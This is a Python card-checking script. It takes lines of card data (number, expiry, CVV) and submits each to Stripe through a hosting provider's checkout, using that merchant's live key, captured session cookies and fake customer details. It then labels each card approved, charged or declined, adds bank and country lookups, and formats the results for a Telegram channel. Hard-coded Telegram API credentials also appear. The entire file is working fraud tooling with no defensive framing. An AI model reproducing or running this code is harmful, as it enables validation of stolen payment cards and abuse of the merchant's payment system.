import requests
import asyncio
import os
from telethon import TelegramClient
api_id = 17058698
api_hash = '088f8d5bf0b4b5c0536b039bb6bdf1d2'

# قائمة بروابط القنوات المستهدفة
channel_names = [
	'https://t.me/STORM_GHOSTS_EARN',
]
def Tele(ccx):
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mes = ccx.split("|")[1]
	ano = ccx.split("|")[2]
	cvv = ccx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	r = requests.session()
	headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
	}
	data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=ee340a80-ab1f-4409-b9d7-654d355dc902af2fe8&muid=867b8863-811f-4053-a495-19b0f18068ba7459d5&sid=80a52f8b-48fa-4f8f-bc62-57a8a69a284518b605&payment_user_agent=stripe.js%2Fd749fa7cbc%3B+stripe-js-v3%2Fd749fa7cbc&time_on_page=91970&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
	try:
		id=(response['id'])
	except Exception as e:
		if "Your card has insufficient funds." in response['error']['message']:
			return response['error']['message']
		elif "Your card's security code is invalid." in response['error']['message']:
			return response['error']['message']
		elif "Your card does not support this type of purchase." in response['error']['message']:
			return response['error']['message']
		elif "Your card's expiration month is invalid." in response['error']['message']:
			return response['error']['message']
		else:
			return response['error']['message']
		return
	cookies = {
		'PAPVisitorId': 'icXSiHVSHBexvaqnCAjYB5NFm4Ois55v',
		'__zlcmid': '1GUlumGZhx63xCM',
		'__stripe_mid': 'a43c1766-189e-413d-a40b-ac25633faaa5607113',
		'__cf_bm': 'RD9SpukOfslD69_9NAe_KiYvZURjTcmo7RXqf3NZSw4-1687568899-0-AVfwhKoTE969ut9rjefXNkdSdcOA/hFQSuoriMgRpGh5YezEZ9SYF1TIVEdIUjcyOw==',
		'WHMCSy551iLvnhYt7': '2f616d69bb4554b65914e2d958950cc7',
		'__stripe_sid': 'a84b2940-7d16-4a03-9799-5d2540300f0c62e775',
	}
	
	headers = {
		'authority': 'my.hostarmada.com',
		'accept': 'application/json, text/javascript, */*; q=0.01',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		# 'cookie': 'PAPVisitorId=icXSiHVSHBexvaqnCAjYB5NFm4Ois55v; __zlcmid=1GUlumGZhx63xCM; __stripe_mid=a43c1766-189e-413d-a40b-ac25633faaa5607113; __cf_bm=RD9SpukOfslD69_9NAe_KiYvZURjTcmo7RXqf3NZSw4-1687568899-0-AVfwhKoTE969ut9rjefXNkdSdcOA/hFQSuoriMgRpGh5YezEZ9SYF1TIVEdIUjcyOw==; WHMCSy551iLvnhYt7=2f616d69bb4554b65914e2d958950cc7; __stripe_sid=a84b2940-7d16-4a03-9799-5d2540300f0c62e775',
		'origin': 'https://my.hostarmada.com',
		'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
		'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
		'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
		'token': 'bcdda0433dd8ff2fa2f8bf324d5cc9e86d8edf13',
		'submit': 'true',
		'custtype': 'new',
		'loginemail': '',
		'loginpassword': '',
		'firstname': 'hhff',
		'lastname': 'gd',
		'email': 'gdfgdd@gmail.com',
		'country-calling-code-phonenumber': [
			'1',
			'',
		],
		'phonenumber': '704-585-6855',
		'companyname': 'gfg',
		'address1': '3185 Freshour Circle San Antonio, TX 78258',
		'address2': 'dhgsy',
		'city': 'hgf',
		'state': 'New York',
		'postcode': '10080',
		'country': 'US',
		'contact': '',
		'domaincontactfirstname': '',
		'domaincontactlastname': '',
		'domaincontactemail': '',
		'country-calling-code-domaincontactphonenumber': '1',
		'domaincontactphonenumber': '',
		'domaincontactcompanyname': '',
		'domaincontactaddress1': '',
		'domaincontactaddress2': '',
		'domaincontactcity': '',
		'domaincontactstate': '',
		'domaincontactpostcode': '',
		'domaincontactcountry': 'US',
		'domaincontacttax_id': '',
		'password': '+4Gh%|yHDnaI',
		'password2': '+4Gh%|yHDnaI',
		'paymentmethod': 'stripe',
		'ccinfo': 'new',
		'ccdescription': '',
		'marketingoptin': '1',
		'accepttos': 'on',
		'payment_method_id': id,
	}
	
	response = requests.post(
		'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
		cookies=cookies,
		headers=headers,
		data=data,
	)
	try:
		return response.json()['warning']
	except:
		return 'ssss'
def Tel(P):
	dollar = '1'
	try:
		data = requests.get('https://lookup.binlist.net/'+P[:6]).json()
	except:
		pass
	try:
		bank=(data['bank']['name'])
	except:
		bank=('unknown ⚠️')
	try:
		emj=(data['country']['emoji'])
	except:
		emj=('unknown ⚠️')
	try:
		cn=(data['country']['name'])
	except:
		cn=('unknown ⚠️')
	try:
		dicr=(data['scheme'])
	except:
		dicr=('unknown ⚠️')
	try:
		typ=(data['type'])
	except:
		typ=('unknown ⚠️')
	try:
		url=(data['bank']['url'])
	except:
		url=('unknown ⚠️')
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bc41e0dc-6835-4cf4-b7ea-b06c604ea584d0fb79&muid=4f3a1d57-29e4-472d-9d22-4709c087c90c54b710&sid=e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20&payment_user_agent=stripe.js%2Fd749fa7cbc%3B+stripe-js-v3%2Fd749fa7cbc&time_on_page=103972&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()		
	try:
		ii=response['error']['message']
		msg1=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑪𝑯𝑨𝑹𝑮𝑬  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑆𝑈𝐶𝐶𝐸𝑆𝑆
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
		msg=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫!  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ {ii}
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
		msg2=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝐷𝐸𝐶𝐿𝐼𝑁𝐸𝐷 ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ {ii}
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
		if "Your card has insufficient funds." in response['error']['message']:
			return msg
		elif "Your card's security code is invalid." in response['error']['message']:
			return msg
		elif "Your card does not support this type of purchase." in response['error']['message']:
			return msg
		elif "Your card's expiration month is invalid." in response['error']['message']:
			return msg
		else:
			return msg2
	except:
		id=(response['id'])
	cookies = {
    '__cf_bm': 'Eoxg5YgIli3.CXHEbGKNCUaDrPSd8S2QjVCngKU12ZU-1687731850-0-AQutBi3hNRM0TDbtZ4av3sWxNmcRdt8EiWT/eedRinT6WKxCXadzbZSJD95l7ZzGIw==',
    '_fbp': 'fb.1.1687735380088.1104063452',
    '__zlcmid': '1GXlvLUHEoMJWUg',
    'WHMCSy551iLvnhYt7': '0f1e69eff1270e47f9894de581c0f3d9',
    '__stripe_mid': '4f3a1d57-29e4-472d-9d22-4709c087c90c54b710',
    '__stripe_sid': 'e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20',
}
	
	headers = {
    'authority': 'my.hostarmada.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__cf_bm=Eoxg5YgIli3.CXHEbGKNCUaDrPSd8S2QjVCngKU12ZU-1687731850-0-AQutBi3hNRM0TDbtZ4av3sWxNmcRdt8EiWT/eedRinT6WKxCXadzbZSJD95l7ZzGIw==; _fbp=fb.1.1687735380088.1104063452; __zlcmid=1GXlvLUHEoMJWUg; WHMCSy551iLvnhYt7=0f1e69eff1270e47f9894de581c0f3d9; __stripe_mid=4f3a1d57-29e4-472d-9d22-4709c087c90c54b710; __stripe_sid=e1ae0297-2020-4723-a2f9-76ed589d2bd24bbf20',
    'origin': 'https://my.hostarmada.com',
    'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	data = {
    'token': '0707729f031b79eb31334665fef5fbb7faf2d2bc',
    'submit': 'true',
    'custtype': 'new',
    'loginemail': '',
    'loginpassword': '',
    'firstname': 'joker',
    'lastname': 'mm',
    'email': 'joker97e@gmail.com',
    'country-calling-code-phonenumber': [
        '1',
        '',
    ],
    'phonenumber': '587-625-8885',
    'companyname': '',
    'address1': '200 banco',
    'address2': '',
    'city': 'NEW YORK',
    'state': 'New York',
    'postcode': '10080',
    'country': 'US',
    'contact': '',
    'domaincontactfirstname': '',
    'domaincontactlastname': '',
    'domaincontactemail': '',
    'country-calling-code-domaincontactphonenumber': '1',
    'domaincontactphonenumber': '',
    'domaincontactcompanyname': '',
    'domaincontactaddress1': '',
    'domaincontactaddress2': '',
    'domaincontactcity': '',
    'domaincontactstate': '',
    'domaincontactpostcode': '',
    'domaincontactcountry': 'US',
    'domaincontacttax_id': '',
    'password': 'JOKER12',
    'password2': 'JOKER12',
    'paymentmethod': 'stripe',
    'ccinfo': 'new',
    'ccdescription': '',
    'marketingoptin': '1',
    'accepttos': 'on',
    'payment_method_id': id,
}
	
	response = requests.post(
	    'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	try:
		ii=response.json()['warning']
	except:
		return msg1
	ii=response.json()['warning']
	msg1=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑪𝑯𝑨𝑹𝑮𝑬  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑆𝑈𝐶𝐶𝐸𝑆𝑆
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
	msg=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫!  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ {ii}
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
	msg2=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝐷𝐸𝐶𝐿𝐼𝑁𝐸𝐷 ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ {ii}
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑺𝑻𝑹𝑰𝑷𝑬 {dollar}$ 
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @THE_S9
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
	if "Your card's security code is" in response.json()['warning']:
		return msg
	elif "Your card has insufficient funds." in response.json()['warning']:
		return msg
	elif "Your card does not support this type of purchase." in response.json()['warning']:
		return msg
	elif "Your card's expiration month is invalid." in response.json()['warning']:
		return msg
	else:
		return msg2
def star(id):
	pass